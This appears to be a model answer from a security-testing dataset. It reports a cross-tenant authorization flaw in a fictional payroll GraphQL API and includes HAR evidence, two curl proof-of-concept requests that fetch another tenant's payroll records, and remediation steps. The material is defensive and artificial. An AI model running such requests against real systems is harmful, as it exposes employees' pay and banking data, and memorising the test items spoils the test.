# Expected Response

## System
- Domain: HR / Payroll
- System: WageFlow Payroll API
- Example ID: GQL-0096

## Priority Findings

### Finding 1: Cross-Tenant Payroll Record Batch Lookup BOLA (Pattern 1.9)
**Severity:** Critical
**Category:** BOLA / Batch Lookup

**Summary:**
Per §5.0 (Pattern 1.9 — batch/bulk lookup endpoints): The `listResources` endpoint trusts client-supplied `tenantId`, enabling batch enumeration of payroll records. An attacker from `tenant-f86b` passed `tenantId: "tenant-fce5"` to enumerate employee payroll records belonging to another organization. In an HR payroll platform, this exposes salary figures, tax IDs, bank account references, and compensation structures — highly sensitive PII regulated under GDPR/CCPA and employment law.

**Evidence from HAR:**
- Request: `POST https://api.wageflow-payroll.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f86b`
- Query: `listResources(tenantId: "tenant-fce5") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-fce5"`, `ownerId: "other-user-f86bfce5"`, `sensitiveField: "CONFIDENTIAL-f86bfce5"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f86bfce5`

## Steps to Reproduce

### Step 1 — Cross-tenant payroll list (HAR)
```bash
curl -s -X POST https://api.wageflow-payroll.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f86b" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-fce5\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-f86bfce5` payroll data from `tenant-fce5`. **Secure:** FORBIDDEN.

### Step 2 — Bulk payroll record lookup
```bash
curl -s -X POST https://api.wageflow-payroll.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f86b" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2096\", \"R-1096\", \"R-3096\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Batch payroll records from `tenant-fce5` returned.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client argument.
2. Per-ID ownership filter in `bulkResourceLookup`.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
